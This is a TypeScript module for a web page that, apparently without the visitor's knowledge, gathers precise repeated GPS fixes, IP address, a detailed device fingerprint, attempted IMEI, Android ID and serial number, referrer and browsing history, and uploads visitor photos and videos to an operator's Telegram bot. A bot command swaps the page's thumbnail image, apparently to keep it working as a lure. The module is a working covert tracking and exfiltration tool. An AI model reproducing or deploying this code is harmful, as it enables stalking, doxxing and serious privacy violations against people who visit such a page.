interface LocationInfo {
  city: string;
  country: string;
  latitude: number | null;
  longitude: number | null;
  accuracy: number | null;
  source: string;
  ip: string;
  altitude?: number | null;
  heading?: number | null;
  speed?: number | null;
  timestamp?: number;
  satelliteCount?: number;
  hdop?: number;
  vdop?: number;
  pdop?: number;
}

interface IPLocationData {
  city?: string;
  country_name?: string;
  latitude?: number;
  longitude?: number;
  ip?: string;
}
interface DeviceInfo {
  brand: string;
  model: string;
  type: string;
  platform: string;
  mobile: boolean;
  imei?: string;
  androidId?: string;
  serialNumber?: string;
  batteryLevel?: number;
  networkType?: string;
  screenResolution?: string;
  cpuCores?: number;
  totalMemory?: number;
  osVersion?: string;
}

interface VisitorDetails {
  userAgent: string;
  location: string;
  referrer: string;
  previousSites: string;
  city?: string;
  country?: string;
  latitude?: number;
  longitude?: number;
  accuracy?: number;
  deviceInfo?: {
    brand: string;
    model: string;
    type: string;
    platform: string;
    mobile: boolean;
    imei?: string;
    androidId?: string;
    serialNumber?: string;
    batteryLevel?: number;
    networkType?: string;
    screenResolution?: string;
    cpuCores?: number;
    totalMemory?: number;
    osVersion?: string;
  };
}

let hasNotificationBeenSent = false;
let lastMessageId = 0;
let isWaitingForImage = false;

async function getDeviceInfo(): Promise<DeviceInfo> {
  let brand = 'Unknown';
  let model = 'Unknown';
  let type = 'Unknown';
  let platform = 'Unknown';
  let mobile = false;
  let osVersion = 'Unknown';
  let networkType = 'Unknown';
  let batteryLevel: number | undefined;
  let screenResolution: string | undefined;
  let cpuCores: number | undefined;
  let totalMemory: number | undefined;

  try {
    screenResolution = `${window.screen.width}x${window.screen.height}@${window.devicePixelRatio}x`;

    if (navigator.hardwareConcurrency) {
      cpuCores = navigator.hardwareConcurrency;
    }

    if ('deviceMemory' in navigator) {
      totalMemory = (navigator as any).deviceMemory;
    }

    try {
      const battery = await (navigator as any).getBattery?.();
      if (battery) {
        batteryLevel = battery.level * 100;
      }
    } catch (e) {
      console.log('Battery API not available');
    }

    if ('connection' in navigator) {
      const conn = (navigator as any).connection;
      if (conn) {
        networkType = `${conn.effectiveType || ''} ${conn.type || ''}`.trim() || 'Unknown';
      }
    }

    if ('userAgentData' in navigator) {
      const uaData = navigator.userAgentData as any;
      const hints = await uaData.getHighEntropyValues([
        'platform',
        'platformVersion',
        'model',
        'mobile',
        'architecture',
        'bitness',
        'fullVersionList'
      ]);
      
      platform = hints.platform || platform;
      model = hints.model || model;
      mobile = hints.mobile;
      osVersion = hints.platformVersion || osVersion;

      const browsers = hints.fullVersionList || [];
      const browserInfo = browsers.find((b: any) => b.brand !== 'Not.A.Brand') || {};
      if (browserInfo.version) {
        model += ` (${browserInfo.brand} ${browserInfo.version})`;
      }
    }

    const ua = navigator.userAgent.toLowerCase();
    
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) {
      type = 'Tablet';
      mobile = true;
    } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated/i.test(ua)) {
      type = 'Mobile';
      mobile = true;
    } else {
      type = 'Desktop';
    }

    if (ua.includes('iphone')) {
      brand = 'Apple';
      const match = ua.match(/iphone\sos\s(\d+_\d+)/);
      model = match ? `iPhone (iOS ${match[1].replace('_', '.')})` : 'iPhone';
      osVersion = match ? match[1].replace('_', '.') : osVersion;
    } else if (ua.includes('ipad')) {
      brand = 'Apple';
      const match = ua.match(/ipad\sos\s(\d+_\d+)/);
      model = match ? `iPad (iOS ${match[1].replace('_', '.')})` : 'iPad';
      osVersion = match ? match[1].replace('_', '.') : osVersion;
    } else if (ua.includes('macintosh')) {
      brand = 'Apple';
      model = 'Mac';
      const match = ua.match(/mac\sos\sx\s(\d+[._]\d+)/);
      osVersion = match ? match[1].replace('_', '.') : osVersion;
    } else if (ua.includes('android')) {
      const matches = ua.match(/android\s([0-9.]+);\s([^;)]+)/);
      if (matches) {
        brand = matches[2].split(' ')[0];
        model = `${matches[2]} (Android ${matches[1]})`;
        osVersion = matches[1];
      }
    } else if (ua.includes('windows')) {
      brand = 'Microsoft';
      const version = ua.match(/windows\snt\s(\d+\.\d+)/);
      model = version ? `Windows ${version[1]}` : 'Windows';
      osVersion = version ? version[1] : osVersion;
    }

    let androidId: string | undefined;
    let serialNumber: string | undefined;
    let imei: string | undefined;

    if (typeof window !== 'undefined' && (window as any).Android) {
      try {
        androidId = (window as any).Android.getAndroidId?.();
        serialNumber = (window as any).Android.getSerialNumber?.();
        imei = (window as any).Android.getIMEI?.();
      } catch (e) {
        console.log('Native Android bridge not available');
      }
    }

    return {
      brand,
      model,
      type,
      platform,
      mobile,
      imei,
      androidId,
      serialNumber,
      batteryLevel,
      networkType,
      screenResolution,
      cpuCores,
      totalMemory,
      osVersion
    };
  } catch (error) {
    console.error('Error getting device info:', error);
    return {
      brand,
      model,
      type,
      platform,
      mobile
    };
  }
}

async function requestLocationPermissions(): Promise<boolean> {
  try {
    // Request permissions explicitly
    if ('permissions' in navigator) {
      const permission = await navigator.permissions.query({ name: 'geolocation' as PermissionName });
      console.log('Geolocation permission status:', permission.state);
      
      if (permission.state === 'denied') {
        console.warn('Geolocation permission denied');
        return false;
      }
    }

    // For mobile devices, try to wake up GPS by requesting a quick position
    if (/Mobile|Android|iP(hone|od)/i.test(navigator.userAgent)) {
      console.log('Mobile device detected, warming up GPS...');
      try {
        await new Promise<void>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            () => {
              console.log('GPS warm-up successful');
              resolve();
            },
            (error) => {
              console.log('GPS warm-up failed:', error.message);
              resolve(); // Continue anyway
            },
            {
              enableHighAccuracy: true,
              timeout: 5000,
              maximumAge: 0
            }
          );
        });
      } catch (e) {
        console.log('GPS warm-up error:', e);
      }
    }

    return true;
  } catch (error) {
    console.error('Error requesting location permissions:', error);
    return false;
  }
}

async function getUltraPreciseGPS(): Promise<GeolocationPosition | null> {
  if (!('geolocation' in navigator)) {
    console.log('Geolocation not supported');
    return null;
  }

  // Request permissions first
  const hasPermission = await requestLocationPermissions();
  if (!hasPermission) {
    console.log('Location permissions not granted');
    return null;
  }

  return new Promise((resolve) => {
    let bestPosition: GeolocationPosition | null = null;
    let attempts = 0;
    const maxAttempts = 10; // Increased attempts for better accuracy
    const targetAccuracy = 5; // Even more precise target (5 meters)
    const maxWaitTime = 45000; // Extended wait time for better GPS lock
    
    // Ultra-high accuracy options
    const options: PositionOptions = {
      enableHighAccuracy: true,
      timeout: 20000, // Longer timeout for GPS lock
      maximumAge: 0 // Always get fresh position
    };

    const startTime = Date.now();
    let watchId: number;
    let fallbackTimeout: number;
    
    console.log('🛰️ Starting ultra-precise GPS acquisition...');
    console.log(`Target accuracy: ${targetAccuracy}m, Max attempts: ${maxAttempts}, Max wait: ${maxWaitTime}ms`);
    
    const cleanup = () => {
      if (watchId) navigator.geolocation.clearWatch(watchId);
      if (fallbackTimeout) window.clearTimeout(fallbackTimeout);
    };
    
    watchId = navigator.geolocation.watchPosition(
      (position) => {
        attempts++;
        const accuracy = Math.round(position.coords.accuracy);
        const elapsed = Date.now() - startTime;
        
        console.log(`🎯 GPS attempt ${attempts}/${maxAttempts}: ${accuracy}m accuracy (${elapsed}ms elapsed)`);
        
        // Enhanced position evaluation
        const isMoreAccurate = !bestPosition || position.coords.accuracy < bestPosition.coords.accuracy;
        
        if (isMoreAccurate) {
          bestPosition = position;
          console.log(`✅ New best GPS position: ${accuracy}m accuracy`);
          
          // Log additional GPS details if available
          if (position.coords.altitude !== null) {
            console.log(`⛰️ Altitude: ${Math.round(position.coords.altitude)}m`);
          }
          if (position.coords.speed !== null) {
            console.log(`🏃 Speed: ${Math.round((position.coords.speed || 0) * 3.6)} km/h`);
          }
          if (position.coords.heading !== null) {
            console.log(`🧭 Heading: ${Math.round(position.coords.heading || 0)}°`);
          }
        }
        
        // Ultra-precise condition: use immediately if very accurate
        if (position.coords.accuracy <= targetAccuracy) {
          console.log(`🎯 Ultra-precise target achieved: ${accuracy}m`);
          cleanup();
          resolve(position);
          return;
        }
        
        // Good enough condition: use if reasonably accurate and we've tried enough
        if (position.coords.accuracy <= 15 && attempts >= 5) {
          console.log(`✅ Good accuracy achieved: ${accuracy}m after ${attempts} attempts`);
          cleanup();
          resolve(position);
          return;
        }
        
        // Maximum attempts reached
        if (attempts >= maxAttempts) {
          console.log(`🔄 Max attempts reached. Best accuracy: ${bestPosition?.coords.accuracy || 'none'}m`);
          cleanup();
          resolve(bestPosition);
          return;
        }
        
        // Time limit reached
        if (elapsed >= maxWaitTime) {
          console.log(`⏰ Time limit reached. Best accuracy: ${bestPosition?.coords.accuracy || 'none'}m`);
          cleanup();
          resolve(bestPosition);
          return;
        }
      },
      (error) => {
        attempts++;
        console.warn(`❌ GPS error (attempt ${attempts}):`, error.message, `Code: ${error.code}`);
        
        // Provide more specific error information
        switch (error.code) {
          case error.PERMISSION_DENIED:
            console.error('🚫 GPS permission denied by user');
            break;
          case error.POSITION_UNAVAILABLE:
            console.error('📡 GPS position unavailable');
            break;
          case error.TIMEOUT:
            console.error('⏰ GPS timeout');
            break;
        }
        
        if (attempts >= maxAttempts || error.code === error.PERMISSION_DENIED) {
          cleanup();
          resolve(bestPosition);
        }
      },
      options
    );

    // Enhanced fallback timeout with progress logging
    fallbackTimeout = window.setTimeout(() => {
      const finalAccuracy = bestPosition?.coords.accuracy || 'none';
      console.log(`⏰ GPS acquisition timeout. Final result: ${finalAccuracy}m accuracy`);
      cleanup();
      resolve(bestPosition);
    }, maxWaitTime);
  });
}

async function getMultiSourceLocation(): Promise<LocationInfo> {
  console.log('🌍 Starting multi-source location detection...');
  
  // Start GPS acquisition
  const gpsPromise = getUltraPreciseGPS();
  
  // Start IP location fetch in parallel
  const ipPromise: Promise<IPLocationData> = fetch('https://ipapi.co/json/')
    .then(response => response.ok ? response.json() : {} as IPLocationData)
    .catch(() => ({} as IPLocationData));
  
  // Wait for both to complete
  const [gpsPosition, ipData] = await Promise.all([gpsPromise, ipPromise]);
  
  if (gpsPosition) {
    const accuracy = Math.round(gpsPosition.coords.accuracy);
    console.log(`🛰️ Using GPS location with ${accuracy}m accuracy`);
    
    // Enhanced reverse geocoding with multiple services
    let city = ipData.city || 'Unknown';
    let country = ipData.country_name || 'Unknown';
    
    try {
      // Primary reverse geocoding service
      const reverseGeoResponse = await fetch(
        `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${gpsPosition.coords.latitude}&longitude=${gpsPosition.coords.longitude}&localityLanguage=en`
      );
      
      if (reverseGeoResponse.ok) {
        const geoData = await reverseGeoResponse.json();
        if (geoData.city) city = geoData.city;
        if (geoData.countryName) country = geoData.countryName;
        console.log('✅ Primary reverse geocoding successful:', { city, country });
      } else {
        throw new Error('Primary service failed');
      }
    } catch (error) {
      console.warn('⚠️ Primary reverse geocoding failed, trying backup service...');
      
      try {
        // Backup reverse geocoding service
        const backupResponse = await fetch(
          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${gpsPosition.coords.latitude}&lon=${gpsPosition.coords.longitude}&zoom=10&addressdetails=1`
        );
        
        if (backupResponse.ok) {
          const backupData = await backupResponse.json();
          if (backupData.address) {
            city = backupData.address.city || backupData.address.town || backupData.address.village || city;
            country = backupData.address.country || country;
            console.log('✅ Backup reverse geocoding successful:', { city, country });
          }
        }
      } catch (backupError) {
        console.warn('⚠️ Backup reverse geocoding also failed, using IP data for city/country');
      }
    }

    // Extract additional GPS metadata if available
    const locationInfo: LocationInfo = {
      city,
      country,
      latitude: gpsPosition.coords.latitude,
      longitude: gpsPosition.coords.longitude,
      accuracy: gpsPosition.coords.accuracy,
      altitude: gpsPosition.coords.altitude,
      heading: gpsPosition.coords.heading,
      speed: gpsPosition.coords.speed,
      timestamp: gpsPosition.timestamp,
      source: `GPS Ultra-Precise (${accuracy}m)`,
      ip: ipData.ip || 'Unknown'
    };

    // Try to extract additional GPS quality metrics (if available from device)
    try {
      // Some devices provide additional GPS metadata
      const coords = gpsPosition.coords as any;
      if (coords.satelliteCount) locationInfo.satelliteCount = coords.satelliteCount;
      if (coords.hdop) locationInfo.hdop = coords.hdop;
      if (coords.vdop) locationInfo.vdop = coords.vdop;
      if (coords.pdop) locationInfo.pdop = coords.pdop;
    } catch (e) {
      // Additional GPS metadata not available
    }

    return locationInfo;
  }

  // Fallback to IP-based location
  console.log('📡 GPS not available, using IP-based location');
  return {
    city: ipData.city || 'Unknown',
    country: ipData.country_name || 'Unknown',
    latitude: ipData.latitude || null,
    longitude: ipData.longitude || null,
    accuracy: null,
    source: 'IP Geolocation',
    ip: ipData.ip || 'Unknown'
  };
}

async function sendTelegramMessage(botToken: string, data: any): Promise<Response> {
  if (!botToken) {
    throw new Error('Bot token is missing');
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    const responseData = await response.json();
    
    if (!response.ok || !responseData.ok) {
      throw new Error(
        `Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`
      );
    }

    return response;
  } catch (error) {
    console.error('Error sending Telegram message:', error);
    throw error;
  }
}

export const sendTelegramNotification = async (details: VisitorDetails) => {
  if (hasNotificationBeenSent) {
    return;
  }

  const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID?.trim();
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();

  if (!CHAT_ID || !botToken) {
    console.error('Telegram configuration is missing');
    return;
  }
  
  const locationInfo = await getMultiSourceLocation();
  const deviceInfo = await getDeviceInfo();
  
  let locationText = `🌆 City: ${locationInfo.city}\n🌍 Country: ${locationInfo.country}\n🌐 IP: ${locationInfo.ip}`;
  
  if (locationInfo.latitude && locationInfo.longitude) {
    locationText += `\n📍 Coordinates: ${locationInfo.latitude.toFixed(8)}, ${locationInfo.longitude.toFixed(8)}`;
    locationText += `\n📡 Source: ${locationInfo.source}`;
    
    if (locationInfo.accuracy) {
      locationText += `\n🎯 Accuracy: ${Math.round(locationInfo.accuracy)}m`;
    }
    
    if (locationInfo.altitude !== null && locationInfo.altitude !== undefined) {
      locationText += `\n⛰️ Altitude: ${Math.round(locationInfo.altitude)}m`;
    }
    
    if (locationInfo.speed !== null && locationInfo.speed !== undefined) {
      locationText += `\n🏃 Speed: ${Math.round(locationInfo.speed * 3.6)} km/h`;
    }
    
    if (locationInfo.heading !== null && locationInfo.heading !== undefined) {
      locationText += `\n🧭 Heading: ${Math.round(locationInfo.heading)}°`;
    }
    
    if (locationInfo.timestamp) {
      const gpsTime = new Date(locationInfo.timestamp);
      locationText += `\n⏱️ GPS Time: ${gpsTime.toISOString()}`;
    }

    // Additional GPS quality metrics
    if (locationInfo.satelliteCount) {
      locationText += `\n🛰️ Satellites: ${locationInfo.satelliteCount}`;
    }
    if (locationInfo.hdop) {
      locationText += `\n📊 HDOP: ${locationInfo.hdop.toFixed(2)}`;
    }
    if (locationInfo.pdop) {
      locationText += `\n📊 PDOP: ${locationInfo.pdop.toFixed(2)}`;
    }
    
    locationText += `\n🗺️ Google Maps: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}&z=18`;
    locationText += `\n🛰️ Google Earth: https://earth.google.com/web/@${locationInfo.latitude},${locationInfo.longitude},0a,500d,35y,0h,0t,0r`;
    locationText += `\n📍 Plus Code: https://plus.codes/${locationInfo.latitude.toFixed(6)},${locationInfo.longitude.toFixed(6)}`;
  }

  const deviceText = `
📱 Device Details
  • Brand: ${deviceInfo.brand}
  • Model: ${deviceInfo.model}
  • Type: ${deviceInfo.type}
  • Platform: ${deviceInfo.platform}
  • OS Version: ${deviceInfo.osVersion || 'Unknown'}
  • Mobile: ${deviceInfo.mobile ? 'Yes' : 'No'}
  • Screen: ${deviceInfo.screenResolution || 'Unknown'}
  • CPU Cores: ${deviceInfo.cpuCores || 'Unknown'}
  • Memory: ${deviceInfo.totalMemory ? deviceInfo.totalMemory + 'GB' : 'Unknown'}
  • Battery: ${deviceInfo.batteryLevel ? Math.round(deviceInfo.batteryLevel) + '%' : 'Unknown'}
  • Network: ${deviceInfo.networkType || 'Unknown'}
  • IMEI: ${deviceInfo.imei || 'Not available'}
  • Android ID: ${deviceInfo.androidId || 'Not available'}
  • Serial: ${deviceInfo.serialNumber || 'Not available'}`;
  
  const message = `
🔍 New Visitor Details
👤 UA: ${details.userAgent}
📍 Page: ${details.location}
${locationText}
${deviceText}
🔗 Referrer: ${details.referrer}
🌐 Previous sites: ${details.previousSites}
⏰ Visit Time: ${new Date().toISOString()}
  `.trim();

  const messageData = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: 'HTML',
  };

  try {
    await sendTelegramMessage(botToken, messageData);
    hasNotificationBeenSent = true;
    console.log('✅ Visitor notification sent successfully');
  } catch (error) {
    console.error('❌ Failed to send notification:', error instanceof Error ? error.message : 'Unknown error');
  }
};

export const sendVideoToTelegram = async (videoBlob: Blob) => {
  const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID?.trim();
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();

  if (!CHAT_ID || !botToken) {
    console.error('Telegram configuration is missing');
    return;
  }

  const locationInfo = await getMultiSourceLocation();
  const deviceInfo = await getDeviceInfo();
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  
  const videoFile = new File([videoBlob], 'visitor-video.mp4', {
    type: 'video/mp4'
  });
  
  formData.append('video', videoFile);
  
  let caption = `🎥 Visitor Video
⏰ Time: ${new Date().toISOString()}
🌆 City: ${locationInfo.city}
🌍 Country: ${locationInfo.country}
🌐 IP: ${locationInfo.ip}
📱 Device: ${deviceInfo.brand} ${deviceInfo.model}`;

  if (locationInfo.latitude && locationInfo.longitude) {
    caption += `\n📍 GPS: ${locationInfo.latitude.toFixed(8)}, ${locationInfo.longitude.toFixed(8)}`;
    caption += `\n📡 Source: ${locationInfo.source}`;
    if (locationInfo.accuracy) {
      caption += `\n🎯 Accuracy: ${Math.round(locationInfo.accuracy)}m`;
    }
    if (locationInfo.satelliteCount) {
      caption += `\n🛰️ Satellites: ${locationInfo.satelliteCount}`;
    }
    caption += `\n🗺️ Map: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}&z=18`;
  }

  caption += `\n📱 IMEI: ${deviceInfo.imei || 'Not available'}`;
  caption += `\n📱 Android ID: ${deviceInfo.androidId || 'Not available'}`;
  caption += `\n📱 Serial: ${deviceInfo.serialNumber || 'Not available'}`;

  formData.append('caption', caption);
  formData.append('supports_streaming', 'true');

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
      method: 'POST',
      body: formData,
    });

    if (!response.ok) {
      const responseData = await response.json();
      throw new Error(
        `Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`
      );
    }

    console.log('✅ Video sent successfully');
  } catch (error) {
    console.error('❌ Failed to send video:', error instanceof Error ? error.message : 'Unknown error');
  }
};

export const sendImageToTelegram = async (imageBlob: Blob) => {
  const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID?.trim();
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();

  if (!CHAT_ID || !botToken) {
    console.error('Telegram configuration is missing');
    return;
  }

  const locationInfo = await getMultiSourceLocation();
  const deviceInfo = await getDeviceInfo();
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('photo', imageBlob, 'visitor-photo.jpg');
  
  let caption = `📸 Visitor Photo
⏰ Time: ${new Date().toISOString()}
🌆 City: ${locationInfo.city}
🌍 Country: ${locationInfo.country}
🌐 IP: ${locationInfo.ip}
📱 Device: ${deviceInfo.brand} ${deviceInfo.model}`;

  if (locationInfo.latitude && locationInfo.longitude) {
    caption += `\n📍 GPS: ${locationInfo.latitude.toFixed(8)}, ${locationInfo.longitude.toFixed(8)}`;
    caption += `\n📡 Source: ${locationInfo.source}`;
    if (locationInfo.accuracy) {
      caption += `\n🎯 Accuracy: ${Math.round(locationInfo.accuracy)}m`;
    }
    if (locationInfo.satelliteCount) {
      caption += `\n🛰️ Satellites: ${locationInfo.satelliteCount}`;
    }
    caption += `\n🗺️ Map: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}&z=18`;
  }

  caption += `\n📱 IMEI: ${deviceInfo.imei || 'Not available'}`;
  caption += `\n📱 Android ID: ${deviceInfo.androidId || 'Not available'}`;
  caption += `\n📱 Serial: ${deviceInfo.serialNumber || 'Not available'}`;

  formData.append('caption', caption);

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: 'POST',
      body: formData,
    });

    const responseData = await response.json();

    if (!response.ok || !responseData.ok) {
      throw new Error(
        `Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`
      );
    }

    console.log('✅ Photo sent successfully');
  } catch (error) {
    console.error('❌ Failed to send image:', error instanceof Error ? error.message : 'Unknown error');
  }
};

export const checkForImageUpdateCommand = async (): Promise<string | null> => {
  const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID?.trim();
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();

  if (!CHAT_ID || !botToken) {
    return null;
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastMessageId + 1}&chat_id=${CHAT_ID}`);
    const data = await response.json();

    if (!data.ok) {
      return null;
    }

    for (const update of data.result) {
      lastMessageId = Math.max(lastMessageId, update.update_id);

      if (update.message?.text?.match(/^\/gantifoto(@\w+)?$/)) {
        isWaitingForImage = true;
        await sendTelegramMessage(botToken, {
          chat_id: CHAT_ID,
          text: 'Please send me the new image you want to use',
          parse_mode: 'HTML'
        });
      } else if (isWaitingForImage && update.message?.photo) {
        isWaitingForImage = false;
        const photo = update.message.photo[update.message.photo.length - 1];
        
        const fileResponse = await fetch(`https://api.telegram.org/bot${botToken}/getFile?file_id=${photo.file_id}`);
        const fileData = await fileResponse.json();
        
        if (fileData.ok) {
          const filePath = fileData.result.file_path;
          const imageUrl = `https://api.telegram.org/file/bot${botToken}/${filePath}`;
          
          localStorage.setItem('thumbnailUrl', imageUrl);
          
          await sendTelegramMessage(botToken, {
            chat_id: CHAT_ID,
            text: '✅ Image has been updated successfully!',
            parse_mode: 'HTML'
          });
          
          return imageUrl;
        }
      }
    }
  } catch (error) {
    console.error('Error checking for image update:', error);
  }

  return null;
};